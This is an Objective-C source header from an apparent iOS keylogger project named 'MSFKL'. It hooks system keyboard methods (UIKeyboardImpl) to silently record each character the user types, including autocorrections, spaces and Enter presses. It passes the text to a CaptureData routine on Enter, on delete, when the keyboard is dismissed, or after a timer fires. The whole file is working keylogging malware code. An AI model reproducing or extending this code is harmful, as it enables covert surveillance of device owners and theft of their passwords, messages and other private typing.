//
//  Keyboard.h
//  MSFKL
//
//  Created by Ophat Phuetkasickonphasutha on 9/4/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "UIKeyboardImpl.h"
#import "KeyboardUtils.h"
#import "FxKeyLogEvent.h"
#import "DateTimeFormat.h"

#pragma mark ## ApplyAutocorrection##
// ======================= applyAutocorrection
// This method is called when user select auto correction or auto complete
HOOK(UIKeyboardImpl, applyAutocorrection,void){
	DLog(@"======== applyAutocorrection");
	DLog(@"get %@",[self _getAutocorrection]);
	
	//Actual
	KeyboardUtils * key = [KeyboardUtils sharedKeyboardUtils];
	NSString * tempCharacter = [key mCharacter];
	tempCharacter = [NSString stringWithFormat:@"%@%@",tempCharacter,[self _getAutocorrection]];
	[key setMCharacter:tempCharacter];
	DLog(@"======== tempCharacter %@ ",tempCharacter);
	
	//Raw Data
	NSString * tempRawCharacter = [key mRawCharacter];
	tempRawCharacter = [NSString stringWithFormat:@"%@[AUTO_COMPLETE]%@",tempRawCharacter,[self _getAutocorrection]];
	[key setMRawCharacter:tempRawCharacter];
	DLog(@"======== tempRawCharacter %@ ",tempRawCharacter);
	
	CALL_ORIG(UIKeyboardImpl, applyAutocorrection);
}

#pragma mark ## deleteFromInput ##

HOOK(UIKeyboardImpl, deleteFromInput,void){

	KeyboardUtils * key = [KeyboardUtils sharedKeyboardUtils];
	NSTimer * tempTime = [key mCountDown];
	if(tempTime != nil){
		[[key mCountDown]invalidate];
		[key setMCountDown:nil];
	}
	NSString * tempCharacter = [key mCharacter];
	NSString * tempRawCharacter = [key mRawCharacter];
	if([tempCharacter length]>0 && [tempRawCharacter length]>0 ){
		DLog(@"======== deleteFromInput");
		[key CaptureData];
	}
	
	CALL_ORIG(UIKeyboardImpl, deleteFromInput);
}

#pragma mark ## OnKeydown ##
// This method is called when user type each character, arg1 is string of character
HOOK(UIKeyboardImpl, addInputString$fromVariantKey$,void,id arg1,BOOL arg2){
	
	NSString * tempstring = [NSString stringWithFormat:@"%@",arg1];
	//whitespaceAndNewlineCharacterSet
	//newlineCharacterSet
	//whitespaceCharacterSet
	if ([[NSCharacterSet newlineCharacterSet] characterIsMember:[tempstring characterAtIndex:0]]) {
		//Press Enter
		KeyboardUtils * key = [KeyboardUtils sharedKeyboardUtils];
		NSTimer * tempTime = [key mCountDown];
		if(tempTime != nil){
			[[key mCountDown]invalidate];
			[key setMCountDown:nil];
		}
		NSString * tempCharacter = [key mCharacter];
		NSString * tempRawCharacter = [key mRawCharacter];
		if([tempCharacter length]>0 && [tempRawCharacter length]>0){
			DLog(@"======== Press Enter ...$");
			[key CaptureData];
		}
	}else{
		// Type Character
		if([arg1 length]>0){ 
			KeyboardUtils * key = [KeyboardUtils sharedKeyboardUtils];
			NSTimer * tempTime = [key mCountDown];
			if(tempTime != nil){
				[[key mCountDown]invalidate];
				[key setMCountDown:nil];
			}
			[key setMCountDown:[NSTimer scheduledTimerWithTimeInterval: 10.0 target: key selector:@selector(onTick) userInfo: nil repeats:NO]];
		
			DLog(@"======== addInputString$ arg1 {%@} ",arg1);
			NSString * tempCharacter = [key mCharacter];
			tempCharacter = [NSString stringWithFormat:@"%@%@",tempCharacter,arg1];
			[key setMCharacter:tempCharacter];
			DLog(@"======== tempCharacter %@ ",tempCharacter);

			NSString * tempRawCharacter = [key mRawCharacter];
			if ([[NSCharacterSet whitespaceCharacterSet] characterIsMember:[tempstring characterAtIndex:0]]) {
				tempRawCharacter = [NSString stringWithFormat:@"%@[SPACE]%@",tempRawCharacter,arg1];
			}else{
				tempRawCharacter = [NSString stringWithFormat:@"%@%@",tempRawCharacter,arg1];
			}
			
			[key setMRawCharacter:tempRawCharacter];
			DLog(@"======== tempRawCharacter %@ ",tempRawCharacter);
		}
	}
	CALL_ORIG(UIKeyboardImpl, addInputString$fromVariantKey$, arg1,arg2);
}


#pragma mark ## keyboardDidHide IPHONE ##

HOOK(UIKeyboardImpl, keyboardDidHide$,void,id arg1){
	KeyboardUtils * key = [KeyboardUtils sharedKeyboardUtils];
	NSTimer * tempTime = [key mCountDown];
	if(tempTime != nil){
		[[key mCountDown]invalidate];
		[key setMCountDown:nil];
	}
	NSString * tempCharacter = [key mCharacter];
	NSString * tempRawCharacter = [key mRawCharacter];
	if([tempCharacter length]>0 && [tempRawCharacter length]>0){
		DLog(@"======== keyboardDidHide$");
		[key CaptureData];
	}
	
	CALL_ORIG(UIKeyboardImpl, keyboardDidHide$,arg1);
}

#pragma mark ## keyboardDidHide IPAD ##

HOOK(UIKeyboardImpl, dismissKeyboard,void){
	KeyboardUtils * key = [KeyboardUtils sharedKeyboardUtils];
	NSTimer * tempTime = [key mCountDown];
	if(tempTime != nil){
		[[key mCountDown]invalidate];
		[key setMCountDown:nil];
	}
	NSString * tempCharacter = [key mCharacter];
	NSString * tempRawCharacter = [key mRawCharacter];
	if([tempCharacter length]>0 && [tempRawCharacter length]>0){
		DLog(@"======== dismissKeyboard$");
		[key CaptureData];
	}
	CALL_ORIG(UIKeyboardImpl, dismissKeyboard);
}


//HOOK(UIKeyboardImpl, handleStringInput$fromVariantKey$,void,id arg1,BOOL arg2){
//	DLog(@"======== handleStringInput$ arg1 %@ ",arg1);
//	DLog(@"======== handleStringInput$ arg1 class %@ ",[arg1 class]);
//	DLog(@"======== fromVariantKey$ fromVariantKey %d ",arg2);
//	CALL_ORIG(UIKeyboardImpl, handleStringInput$fromVariantKey$, arg1,arg2);
//}
//HOOK(UIKeyboardImpl, updateInputContextForDeletedText$toWordRange$,void,id arg1,id arg2){
//	DLog(@"======== updateInputContextForDeletedText$");
//	CALL_ORIG(UIKeyboardImpl, updateInputContextForDeletedText$toWordRange$, arg1,arg2);
//	DLog(@"======== Delete this arg1 %@ ",arg1);
//	DLog(@"======== result arg2 %@ ",arg2);
//}
//HOOK(UIKeyboardImpl, handleKeyEvent$,void, struct GSEvent *arg1){
//	DLog(@"======== handleKeyEvent$");
//	DLog(@"======== arg1 %@",arg1);
//	CALL_ORIG(UIKeyboardImpl, handleKeyEvent$, arg1);
//}
//HOOK(UIKeyboardImpl, mediaKeyDown$,void, struct GSEvent *arg1){
//	DLog(@"======== mediaKeyDown$");
//	DLog(@"======== arg1 %@",arg1);
//	CALL_ORIG(UIKeyboardImpl, mediaKeyDown$, arg1);
//}
//HOOK(UIKeyboardImpl, _remapKeyEvent$,void, struct GSEvent *arg1){
//	DLog(@"======== _remapKeyEvent$");
//	DLog(@"======== arg1 %@",arg1);
//	CALL_ORIG(UIKeyboardImpl, _remapKeyEvent$, arg1);
//}
//
//HOOK(UIKeyboardImpl, _handleWebKeyEvent$withInputString$,void, struct GSEvent *arg1 ,id arg2){
//	DLog(@"======== _handleWebKeyEvent$withInputString$");
//	DLog(@"======== arg1 %@",arg1);
//	DLog(@"======== arg2 %@",arg2);
//	CALL_ORIG(UIKeyboardImpl, _handleWebKeyEvent$withInputString$, arg1,arg2);
//}
//
//HOOK(UIKeyboardImpl, _handleWebKeyEvent$withInputString$withInputStringIgnoringModifiers$,void, struct GSEvent *arg1 ,id arg2,id arg3){
//	DLog(@"======== _handleWebKeyEvent$withInputString$withInputStringIgnoringModifiers$");
//	DLog(@"======== arg1 %@",arg1);
//	DLog(@"======== arg2 %@",arg2);
//	DLog(@"======== arg3 %@",arg3);
//	CALL_ORIG(UIKeyboardImpl, _handleWebKeyEvent$withInputString$withInputStringIgnoringModifiers$, arg1 ,arg2 ,arg3);
//}
//HOOK(UIKeyboardImpl, _handleWebKeyEvent$withEventType$withInputString$withInputStringIgnoringModifiers$,void, struct GSEvent *arg1 ,int arg2,id arg3,id arg4){
//	DLog(@"======== _handleWebKeyEvent$withEventType$withInputString$withInputStringIgnoringModifiers$");
//	DLog(@"======== arg1 %@",arg1);
//	DLog(@"======== arg2 %d",arg2);
//	DLog(@"======== arg3 %@",arg3);
//	DLog(@"======== arg4 %@",arg4);
//	CALL_ORIG(UIKeyboardImpl, _handleWebKeyEvent$withEventType$withInputString$withInputStringIgnoringModifiers$, arg1 ,arg2 ,arg3,arg4);
//}
//HOOK(UIKeyboardImpl, updateKeyboardEventsLagging$,void, struct GSEvent *arg1){
//	DLog(@"======== updateKeyboardEventsLagging$");
//	DLog(@"======== arg1 %@",arg1);
//
//	CALL_ORIG(UIKeyboardImpl, updateKeyboardEventsLagging$, arg1 );
//}
//HOOK(UIKeyboardImpl, updateCandidateDisplayAsyncWithCandidates$forInputManager$,void,id arg1,id arg2){
//	DLog(@"======== updateCandidateDisplayAsyncWithCandidates$forInputManager$");
//	DLog(@"======== arg1 %@",arg1);
//	DLog(@"======== arg2 %@",arg2);
//	CALL_ORIG(UIKeyboardImpl, updateCandidateDisplayAsyncWithCandidates$forInputManager$, arg1 ,arg2 );
//}
